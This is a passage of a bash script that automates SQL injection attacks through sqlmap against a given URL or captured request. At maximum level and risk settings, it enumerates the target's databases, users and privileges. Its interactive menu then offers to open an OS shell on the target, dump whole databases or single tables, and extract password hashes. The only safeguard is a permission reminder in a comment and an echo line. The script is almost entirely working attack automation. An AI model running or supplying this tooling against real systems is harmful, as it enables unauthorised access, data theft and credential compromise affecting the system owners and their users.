            host=$(echo "$host" | sed 's/:[0-9]*//')
            LOG_FILE="$basedir/$host/log"
            ;;
        d)
            dbms_name="$OPTARG"
            ;; 
        *)
            usage
            ;;
    esac
done

# Check if at least one of -r or -u is provided
if [ -z "$REQUEST_FILE" ] && [ -z "$URL" ]; then
    usage
fi

if [ "$dbms_name" != "" ]; then
    appenddbns="--dbms=$dbms_name"
fi
 
# Set the sqlmap options for initial scan (users, privileges, etc.)
SQLMAP_OPTIONS_BASIC="--dbs $appenddbns --ignore-stdin --batch --level=5 --risk=3 \
--threads=10 --current-user --hostname --current-db --users --passwords --roles --priv-esc --output-dir=$basedir \
--dump-format=html --exclude-sysdbs --random-agent"

echo "running command: sqlmap $TARGET $SQLMAP_OPTIONS_BASIC"


basedir_sqlmap="$basedir/$host"
result_dir="$basedir/result_sqlmap_$host"
logdbs="$result_dir/dbs_structure.log"

HIDDEN_DBS_CACHE="$result_dir/.hidden_dbs_cache"
HIDDEN_PASSWORDS_CACHE="$result_dir/.hidden_passwords_cache"

echo "sqlmap Log file will be saved at file: $LOG_FILE"
echo "analyzed results will be saved at folder:$result_dir/"
echo ""

merge_cache_files

# Run sqlmap based on the provided input
if [ -n "$REQUEST_FILE" ]; then
    # If request file is provided
    TARGET="-r $REQUEST_FILE"
    if check_dbms_and_dbs; then
        sqlmap $TARGET $SQLMAP_OPTIONS_BASIC
    fi
elif [ -n "$URL" ]; then
    # If target URL or IP is provided
    TARGET="-u $URL"
    if check_dbms_and_dbs; then
      sqlmap $TARGET $SQLMAP_OPTIONS_BASIC
    fi
fi
echo ""


if [ ! -d "$result_dir" ]; then
    mkdir -p "$result_dir"
fi

if [ ! -f "$logdbs" ]; then
    # Ensure the parent directory exists first
    mkdir -p "$(dirname "$logdbs")"
    touch "$logdbs"
fi

if [ -z "$dbms_name" ]; then
    dbms_name=$(extract_dbms)
fi

# Check if DBMS name is found
if [ -n "$dbms_name" ]; then
    # Check if DBMS is already in the log file
    if ! grep -q "DBMS:" "$logdbs"; then
        # If not found, log the DBMS name
        echo "DBMS: $dbms_name" | tee -a "$logdbs"
    else
        # If found, print DBMS name (just for confirmation, not to log it again)
        echo "DBMS: $dbms_name"
    fi
    
    # Display and log system information
    echo ""
    echo "System Information:"
    system_info=$(extract_system_info)
    if [ -n "$system_info" ]; then
        echo -e "$system_info"
    else
        echo "  No system information found in the log."
    fi
else
    # If DBMS is not found, log the message and exit
    exit 1
fi


dbs=$(extract_databases )
 
if [ -n "$dbs" ]; then
    # Filter out empty lines and information_schema from display 
    filtered_dbs=$(echo "$dbs" | grep -v "^$" | grep -v "^information_schema$")
    
    # Completely rebuild the structure log with consistent formatting each time
    rebuild_structure_log "$dbms_name" "$dbs" "$logdbs"
    
    # Display the filtered list to user
    echo ""
    echo "Databases found (excluding information_schema):"
    if [ -n "$filtered_dbs" ]; then
        echo "$filtered_dbs" | sort | sed 's/^/  /'
    else
        echo "  No user databases found"
    fi
    
    # Populate the databases array - filter out empty lines
    readarray -t all_databases <<< "$(echo "$dbs" | grep -v "^$")"
    
    # Include all databases including information_schema for menu interactions
    databases=()
    for db in "${all_databases[@]}"; do
        # Trim whitespace
        db=$(normalize_db_name "$db")
        if [[ -n "$db" ]]; then
            databases+=("$db")
        fi
    done
    
    # If no databases found, still keep the technical ones for processing
    if [ ${#databases[@]} -eq 0 ]; then
        databases=("${all_databases[@]}")
    fi
else
    # If no databases are found, warn but don't exit - the user might want to retry
    echo "No databases found in the current output."
    echo "This could be because:"
    echo "  1. The target is not vulnerable to SQL injection"
    echo "  2. The SQL injection vulnerability doesn't allow database enumeration"
    echo "  3. You need to run a more specific sqlmap command"
    
    read -p "Do you want to continue anyway? (y/n): " continue_anyway
    if [[ "$continue_anyway" != "y" && "$continue_anyway" != "Y" ]]; then
        echo "Exiting script."
        exit 1
    fi
    
    # Create an empty databases array so the menu still works
    databases=()
    
    # If we have a DBMS name, update the structure log at least with that
    if [ -n "$dbms_name" ]; then
        echo "DBMS: $dbms_name" > "$logdbs"
        echo "" >> "$logdbs"
        echo "Databases:" >> "$logdbs"
        echo "" >> "$logdbs"
    fi
fi

# Processing of databases array was already done above

# Define the common SQL options for sqlmap
SQLMAP_OPTIONS="$appenddbns --ignore-stdin --batch --level=5 --risk=3 \
                            --threads=10 --output-dir=$basedir --dump-format=html --exclude-sysdbs \
                            --random-agent --current-user --current-db --roles --priv-esc "

# Loop to provide the user with options
while true; do
    echo ""
    echo "Please select an option:"
    echo "1 - Attempt to get a shell"
    echo "2 - Dump all data from a specific database"
    echo "3 - Dump tables names from a specific database"
    echo "4 - Dump data from a specific table in a database"
    echo "5 - Dump all databases and tables"
    echo "6 - Dump password hashes only"
    echo "7 - exit"
    
    read -p "Enter your choice: " choice
    
    case $choice in
        1)
            # SECURITY WARNING: Shell access should only be used for authorized security testing
            # and in compliance with applicable laws. Unauthorized access is illegal.
            echo "Trying to get a shell using sqlmap..."
            echo "REMINDER: Only use this functionality on systems you have permission to test."
            sqlmap $TARGET --os-shell $SQLMAP_OPTIONS
            ;;
        
        2)
            echo "Please select a database by number:"
            select db in "${databases[@]}"; do
                if [[ -n "$db" ]]; then
                    echo "You selected: $db"
                    break
                else
                    echo "Invalid selection. Please choose a valid number."
                fi
            done

            # Create directory for this database if it doesn't exist
            db_dir="$result_dir/$db"
            if [ ! -d "$db_dir" ]; then
                mkdir -p "$db_dir"
            fi
            
            # Check if we already have table files for this database
            existing_tables=$(find "$result_dir/$db/" -name "${db}.*.log" 2>/dev/null)
            if [ -n "$existing_tables" ]; then
                echo "Tables for $db have already been captured:"
                find "$result_dir/$db/" -name "${db}.*.log" | sed "s|$result_dir/$db/${db}.\(.*\)\.log|  \1|"
                
                read -p "Do you want to re-dump all tables (this may overwrite existing data)? (y/n): " redump
                if [[ "$redump" != "y" && "$redump" != "Y" ]]; then
                    continue
                fi
            fi
            
            # Run sqlmap again with the selected DBMS and database to dump data
            echo "Running sqlmap to dump data from $db (DBMS: $dbms_name)..."
            SQLMAP_OPTIONS_DB=" -D $db --dump-all --tables $SQLMAP_OPTIONS"
            sqlmap $TARGET $SQLMAP_OPTIONS_DB 2>/dev/null
            
            # Process the output to extract table data and save to files
            echo "Extracting tables and data to structured format..."
            capture_table_data
            
            # Rebuild the structure log to ensure consistency
            dbs=$(extract_databases)
            rebuild_structure_log "$dbms_name" "$dbs" "$logdbs"
            
            # Make sure database is in the structure file even if empty
            if ! grep -q "^database ${db}:" "$logdbs"; then
                echo "Note: Database '$db' appears to be empty or access is restricted"
            fi
            
            # Show the user what we extracted
            echo ""
            echo "Database: $db"
            echo "Tables extracted:"
            find "$result_dir/$db/" -name "${db}.*.log" 2>/dev/null | sort | xargs -n1 basename 2>/dev/null | sed 's/^/  /'
            
            # If we didn't extract any tables, show a message
            if [ ! "$(find "$result_dir/$db/" -name "${db}.*.log" 2>/dev/null)" ]; then
                echo "  No table data was extracted. The database might be empty or not accessible."
            fi
            ;;

        3)  
            echo "Please select a database by number:"
            select db in "${databases[@]}"; do
                if [[ -n "$db" ]]; then
                    echo "You selected: $db"
                    break
                else
                    echo "Invalid selection. Please choose a valid number."
                fi
            done
            
            # Create directory for this database if it doesn't exist
            db_dir="$result_dir/$db"
            if [ ! -d "$db_dir" ]; then
                mkdir -p "$db_dir"
            fi
            # Check if we already have table data for this database
            if extract_tables "$db"; then
                safe_db_name="${db//[^a-zA-Z0-9_]/_}"
                # Display existing tables
                echo ""
                echo "Tables for $db have already been captured:"
                eval "tables=(\"\${${safe_db_name}_tables[@]}\")"
                for table in "${tables[@]}"; do
                    echo "   $table"
                done
                
                # Ask if user wants to redump
                read -p "Do you want to re-dump tables for this database? (y/n): " redump
                if [[ "$redump" != "y" && "$redump" != "Y" ]]; then
                    continue
                fi
            fi
            
            # Run sqlmap to get tables if no tables were found or user wants to redump
            echo "Running sqlmap to get tables from $db (DBMS: $dbms_name)..."
            SQLMAP_OPTIONS_DB=" -D $db --tables $SQLMAP_OPTIONS --dump"
            sqlmap $TARGET $SQLMAP_OPTIONS_DB
            
            # Extract and display the updated tables
            if extract_tables "$db"; then
                safe_db_name="${db//[^a-zA-Z0-9_]/_}"
                echo ""
                echo "Tables in database $db:"
                eval "tables=(\"\${${safe_db_name}_tables[@]}\")"
                for table in "${tables[@]}"; do
                    echo "   $table"
                done
            else
                echo "No tables found in database $db or access is restricted."
            fi
            ;;

        4)
            echo "Please select a database by number:"
            select db in "${databases[@]}"; do
                if [[ -n "$db" ]]; then
                    echo "You selected: $db"
                    break
                else
                    echo "Invalid selection. Please choose a valid number."
                fi
            done
            
            # First, make sure we have the tables for this database
            if ! extract_tables "$db"; then
                echo "Getting tables for $db..."
                SQLMAP_OPTIONS_DB=" -D $db --tables $SQLMAP_OPTIONS --dump --dump-format=html --exclude-sysdbs"
                sqlmap $TARGET $SQLMAP_OPTIONS_DB 2>/dev/null
                
                # Still try to extract tables even if sqlmap reported empty/error
                if ! extract_tables "$db"; then
                    echo "Note: Database '$db' appears to be empty or access is restricted"
                    # Add it to the structure file anyway so we know it exists but is empty
                    if grep -q "^database ${db}:" "$logdbs"; then
                        # Database entry exists but might not have table info
                        if ! grep -q "tables:" -A1 <(grep -A3 "^database ${db}:" "$logdbs"); then
                            # Add tables section if it doesn't exist
                            sed -i "/^database ${db}:/a\ tables:" "$logdbs"
                        fi
                    else
                        # Add database entry with empty tables
                        echo -e "\ndatabase ${db}:\n tables:" >> "$logdbs"
                    fi
                fi
            fi
            
            # Create directory for this database if it doesn't exist
            db_dir="$result_dir/$db"
            if [ ! -d "$db_dir" ]; then
                mkdir -p "$db_dir"
            fi
            
            # Get the array name for this database's tables
            safe_db_name="${db//[^a-zA-Z0-9_]/_}"
            tables_array_name="${safe_db_name}_tables[@]"
            
            # Check if we have tables
            if [[ -z "${!tables_array_name}" ]]; then
                echo "No tables found for database $db"
                continue
            fi
            
            # Let user select a table
            echo "Please select a table by number:"
            select table in "${!tables_array_name}"; do
                if [[ -n "$table" ]]; then
                    echo "You selected: $table"
                    break
                else
                    echo "Invalid selection. Please choose a valid number."
                fi
            done
            
            # Check if table file exists and has content in our structured results
            table_file="$result_dir/$db/${db}.${table}.log"
            csv_file="$result_dir/$db/${db}.${table}.csv"
             
            # If the file exists, ask if user wants to re-dump
            if [ -f "$table_file" ] && [ -s "$table_file" ]; then
                echo ""
                echo "Table '$table' has already been dumped to: $table_file"
                read -p "Do you want to re-dump this table (this may overwrite existing data)? (y/n): " redump
                if [[ "$redump" != "y" && "$redump" != "Y" ]]; then
                    # If user chose not to redump, just show the preview and continue to next iteration
                    echo "Content preview [5 lines]:"
                    head -n 5 "$table_file"
                    continue
                fi
                # If user chose to redump, execution continues below
            fi
            
            # Dump the selected table
            echo "Dumping contents of table '$table' from database '$db'..."
            SQLMAP_OPTIONS_TABLE=" -D $db -T $table --dump --dump-format=html --exclude-sysdbs  $SQLMAP_OPTIONS"
            sqlmap $TARGET $SQLMAP_OPTIONS_TABLE
            
            # Process the output to save to our structure
            capture_table_data
            
            # Rebuild the structure log to ensure consistency
            dbs=$(extract_databases)
            rebuild_structure_log "$dbms_name" "$dbs" "$logdbs"
            
            # Verify if the dump succeeded
            if [ -f "$table_file" ]; then
                echo "Data has been stored in $table_file"
                echo "Content preview [5 lines]:"
                head -n 5 "$table_file"
            else
                # Try to copy from sqlmap's default dump location as fallback
                dump_file="$basedir_sqlmap/dump/$db/$table.csv"
                if [ -f "$dump_file" ]; then
                    # Create table file with proper naming
                    echo "# Table: $db.$table" > "$table_file"
                    echo "# Extracted: $(date)" >> "$table_file"
                    echo "# Imported from sqlmap default dump" >> "$table_file"
                    echo "" >> "$table_file"
                    
                    # Convert CSV to table format
                    echo "+---------------------------------------------------+" >> "$table_file"
                    head -n 1 "$dump_file" | sed 's/,/ | /g' | sed 's/^/| /' | sed 's/$/ |/' >> "$table_file"
                    echo "+---------------------------------------------------+" >> "$table_file"
                    tail -n +2 "$dump_file" | sed 's/,/ | /g' | sed 's/^/| /' | sed 's/$/ |/' >> "$table_file"
                    
                    # Also copy as CSV
                    cp "$dump_file" "$csv_file"
                    
                    echo "Data has been stored in $table_file (imported from sqlmap)"
                    echo "Content preview [5 lines]:"
                    head -n 5 "$table_file"
                else
                    echo "No table data found. The table might be empty or not accessible."
                fi
            fi
            ;;
        5)
            SQLMAP_OPTIONS_DB="--dump-all  $SQLMAP_OPTIONS"
            sqlmap $TARGET $SQLMAP_OPTIONS_DB
            capture_table_data
            
            # Rebuild the structure log to ensure consistency
            dbs=$(extract_databases)
            rebuild_structure_log "$dbms_name" "$dbs" "$logdbs"
            ;;
        6) 
            if [ -f "$result_dir/sqlmap_passwords.log" ]; then
                if grep -q "User:" "$result_dir/sqlmap_passwords.log" && grep -q "Password" "$result_dir/sqlmap_passwords.log"; then
                    echo "Password hashes have already been captured. Here are the details:"
                    cat "$result_dir/sqlmap_passwords.log"
                    continue
                fi
            fi
            SQLMAP_OPTIONS_DB=" --passwords $SQLMAP_OPTIONS --dump"
            sqlmap $TARGET $SQLMAP_OPTIONS_DB
            capture_password_hashes
            ;;
       
        7)
            echo "Exiting the script."
            break
            ;;
        
        *)
            echo "Invalid option. Please choose a valid option (1/2/3/4/5/6/7)."
            ;;
    esac
done